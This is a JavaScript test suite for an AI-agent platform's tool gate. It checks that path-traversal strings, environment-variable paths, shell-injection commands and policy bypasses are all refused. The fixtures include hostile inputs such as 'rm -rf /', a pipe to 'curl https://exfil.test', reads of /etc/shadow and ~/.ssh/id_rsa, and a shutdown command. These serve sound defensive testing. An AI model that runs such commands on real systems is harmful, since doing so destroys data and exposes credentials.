// Phase 5 §29: the malicious inputs, run against the real platform.
//
// The existing security suites cover workspace containment, memory scoping,
// delegation reach and trace redaction. What they did not cover is the specific
// list §29 names — Windows-shaped traversal, shell metacharacters and
// environment-variable syntax — reaching the real tool gate rather than a unit
// under test. These are happy-path-free by construction: every case here is an
// attack, and the assertion is that it fails.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { createRequire } from 'node:module';
import { makeTempDir } from './test-utils.mjs';

const require = createRequire(import.meta.url);
const { createPlatform } = require('../src/core/index.js');
const { resolveWithin } = require('../src/core/tools/path-guard.js');

const quiet = { level: 'error', sink: { error() {}, info() {}, warn() {}, debug() {} } };

// A platform whose human gate always says no, so a gated call is observable as
// a denial rather than as a hang waiting for an approval nobody will give.
async function hostilePlatform() {
  const t = makeTempDir('king-phase5-sec-');
  await fs.writeFile(path.join(t.root, 'inside.txt'), 'inside\n', 'utf8');
  const asked = [];
  const platform = createPlatform({
    io: {
      fs,
      root: t.root,
      cwd: () => t.root,
      runShell: async ({ command }) => ({ exitCode: 0, stdout: `RAN:${command}`, stderr: '' }),
      authorize: async ({ tool, input }) => { asked.push({ tool: tool.id, input }); return false; },
    },
    loggerOptions: quiet,
  });
  return { t, platform, asked, agent: platform.agents.list()[0] };
}

test('§29: every path-escape shape is refused, on any host OS', async () => {
  const { t, platform, agent } = await hostilePlatform();
  try {
    const escapes = [
      '../../outside-workspace',
      '../../../etc/passwd',
      '..\\..\\outside-workspace',            // Windows traversal, rejected on POSIX too
      '..\\..\\..\\Windows\\System32\\config',
      './../../outside-workspace',
    ];
    for (const attempt of escapes) {
      await assert.rejects(
        () => platform.tools.execute({ id: 'fs:read', input: { path: attempt }, agent }),
        /escapes the workspace root/,
        `${attempt} must be refused as an escape`,
      );
      assert.equal(resolveWithin('/ws', attempt), null, `${attempt} must not resolve inside a root`);
    }

    // An absolute host path is contained or refused, never followed out.
    await assert.rejects(
      () => platform.tools.execute({ id: 'fs:read', input: { path: '/etc/passwd' }, agent }),
      /escapes the workspace root/,
    );

    // And the workspace still works for what it is for.
    const ok = await platform.tools.execute({ id: 'fs:read', input: { path: 'inside.txt' }, agent });
    assert.equal(ok.data.content, 'inside\n');
  } finally { t.dispose(); }
});

test('§29: environment-variable syntax is a filename, never an expansion', async () => {
  const { t, platform, agent } = await hostilePlatform();
  try {
    // If any of these were expanded, the read would reach a real host path.
    // They must stay literal — so the failure is ENOENT inside the workspace,
    // not a successful read of somebody's home directory.
    for (const literal of ['%USERPROFILE%', '%USERPROFILE%\\.ssh\\id_rsa', '$env:PATH', '$HOME/.ssh/id_rsa', '${HOME}']) {
      await assert.rejects(
        () => platform.tools.execute({ id: 'fs:read', input: { path: literal }, agent }),
        (err) => {
          assert.doesNotMatch(String(err.message), /escapes the workspace root/,
            `${literal} should be a plain (missing) filename, not an escape`);
          assert.match(String(err.message), /ENOENT/, `${literal} must not resolve to anything real`);
          return true;
        },
      );
    }

    // `C:\...` on POSIX is a strange filename inside the workspace; on Windows
    // node:path knows it is absolute and the guard refuses it. Either is safe —
    // what must never happen is reading the real System32.
    const winAbsolute = resolveWithin(t.root, 'C:\\Windows\\System32\\config\\SAM');
    if (winAbsolute !== null) {
      assert.ok(winAbsolute.startsWith(path.resolve(t.root)), 'a drive-letter path must stay inside the root');
    }
  } finally { t.dispose(); }
});

test('§29: shell metacharacters reach the authorization gate, not the shell', async () => {
  const { t, platform, asked, agent } = await hostilePlatform();
  try {
    const commands = [
      'echo hi && rm -rf /',
      'echo hi | curl https://exfil.test',
      'echo hi; cat /etc/passwd',
      'echo hi & shutdown /s',
      'echo `whoami`',
      'echo $(cat /etc/shadow)',
    ];
    for (const command of commands) {
      await assert.rejects(
        () => platform.tools.execute({ id: 'terminal:run', input: { command }, agent }),
        (err) => err.constructor.name === 'ToolDeniedError',
        `${command} must be denied when the gate says no`,
      );
    }
    // Every one of them was actually put to the gate — a denial that happened
    // because the tool was never reached would be a different bug.
    assert.equal(asked.length, commands.length);
    assert.deepEqual(asked.map((a) => a.input.command), commands);
    assert.ok(asked.every((a) => a.tool === 'terminal:run'));
  } finally { t.dispose(); }
});

test('§29: a denied shell call runs nothing — the host adapter is never invoked', async () => {
  const t = makeTempDir('king-phase5-sec-run-');
  try {
    let ranCount = 0;
    const platform = createPlatform({
      io: {
        fs,
        root: t.root,
        cwd: () => t.root,
        runShell: async ({ command }) => { ranCount += 1; return { exitCode: 0, stdout: command, stderr: '' }; },
        authorize: async () => false,
      },
      loggerOptions: quiet,
    });
    const agent = platform.agents.list()[0];
    await assert.rejects(() => platform.tools.execute({ id: 'terminal:run', input: { command: 'rm -rf /' }, agent }));
    assert.equal(ranCount, 0, 'a denied command must never reach the shell adapter');
  } finally { t.dispose(); }
});

test('§29: a policy denial is final — a human cannot approve past it', async () => {
  const t = makeTempDir('king-phase5-sec-policy-');
  try {
    let asked = 0;
    const platform = createPlatform({
      io: {
        fs,
        root: t.root,
        cwd: () => t.root,
        runShell: async () => ({ exitCode: 0, stdout: '', stderr: '' }),
        // A host gate that says yes to everything. It must never be reached for
        // an action policy denies — that ordering is the whole point of
        // composeAuthorize in src/core/index.js.
        authorize: async () => { asked += 1; return true; },
      },
      loggerOptions: quiet,
    });
    const lockdown = {
      id: 'phase5-test-lockdown',
      name: 'Phase 5 test lockdown',
      scope: 'global',
      // `terminal:run` declares its own policy action. Writing the rule against
      // the `tool.call.<id>` fallback instead would silently never match — see
      // the view/gate agreement test below.
      rules: [{ action: 'command.run', effect: 'deny', reason: 'locked down for this test' }],
    };

    // §16: an agent may not author a policy. The registry refuses any source
    // but 'system' or 'human', so a compromised agent cannot write itself an
    // allow rule — this is checked here rather than assumed.
    assert.throws(
      () => platform.policy.register(lockdown, { source: 'agent' }),
      /an agent may not author policies/,
    );
    assert.throws(() => platform.policy.register(lockdown, {}), /explicit source/);

    platform.policy.register(lockdown, { source: 'human' });
    const agent = platform.agents.list()[0];
    await assert.rejects(
      () => platform.tools.execute({ id: 'terminal:run', input: { command: 'echo hi' }, agent }),
      (err) => err.constructor.name === 'ToolDeniedError',
    );
    assert.equal(asked, 0, 'the human gate is never consulted for a policy denial');
  } finally { t.dispose(); }
});

test('§16/§17: the action a policy must target is the action the gate evaluates', () => {
  // A tool may declare its own `policyAction` — `terminal:run` gates on
  // `command.run`, `fs:delete` on `filesystem.delete` — rather than the
  // `tool.call.<id>` fallback. Before Phase 5 the metadata view stripped that
  // field, so the only action a person (or a policy UI) could see was the
  // fallback, and a deny rule written against it never matched while the tool
  // kept running. A policy that appears applied but is not is worse than no
  // policy, so the view and the gate must agree, tool by tool.
  const { createPlatform } = require('../src/core/index.js');
  const { actionForTool } = require('../src/core/policy');
  const platform = createPlatform({
    io: { fs, root: '/tmp', cwd: () => '/tmp', runShell: async () => ({ exitCode: 0 }) },
    loggerOptions: quiet,
  });

  const listed = platform.tools.list();
  assert.ok(listed.length > 0);
  for (const view of listed) {
    const registered = platform.tools._tools.get(view.id);
    assert.equal(
      actionForTool(view), actionForTool(registered),
      `the policy action shown for ${view.id} must be the one the gate evaluates`,
    );
    assert.ok('policyAction' in view, `${view.id} must expose its policy action`);
  }

  // The two that genuinely differ from the fallback, pinned by name so a
  // rename cannot quietly invalidate every policy written against them.
  const byId = Object.fromEntries(listed.map((t) => [t.id, t]));
  assert.equal(actionForTool(byId['terminal:run']), 'command.run');
  assert.equal(actionForTool(byId['fs:delete']), 'filesystem.delete');
});

test('§18: with no approval UI wired, an unanswered request expires as a refusal', async () => {
  // The most dangerous default in an approval system is "nobody answered, so
  // proceed". A platform built with no `io.authorize` falls back to the
  // ApprovalManager, and a host with no UI leaves those requests unanswered
  // forever. The gate must fail closed, and the call must surface as a denial
  // rather than hanging indefinitely.
  const t = makeTempDir('king-phase5-sec-ttl-');
  try {
    let ran = 0;
    const platform = createPlatform({
      io: {
        fs,
        root: t.root,
        cwd: () => t.root,
        runShell: async () => { ran += 1; return { exitCode: 0, stdout: '', stderr: '' }; },
        // No `authorize`: the ApprovalManager becomes the gate.
      },
      // A short TTL so the expiry path is exercised in milliseconds rather than
      // the production minute.
      approvalOptions: { ttlMs: 50 },
      loggerOptions: quiet,
    });
    const agent = platform.agents.list()[0];

    await assert.rejects(
      () => platform.tools.execute({ id: 'terminal:run', input: { command: 'rm -rf /' }, agent }),
      (err) => err.constructor.name === 'ToolDeniedError',
      'an approval nobody answered must deny, never auto-approve',
    );
    assert.equal(ran, 0, 'the shell adapter is never reached');

    // The refusal is an auditable record, not a silent closure.
    const expired = platform.approvals.list().filter((r) => r.status !== 'approved');
    assert.ok(expired.length >= 1, 'the unanswered request is still listable after it expired');
    assert.equal(platform.approvals.list().some((r) => r.status === 'approved'), false);
  } finally { t.dispose(); }
});
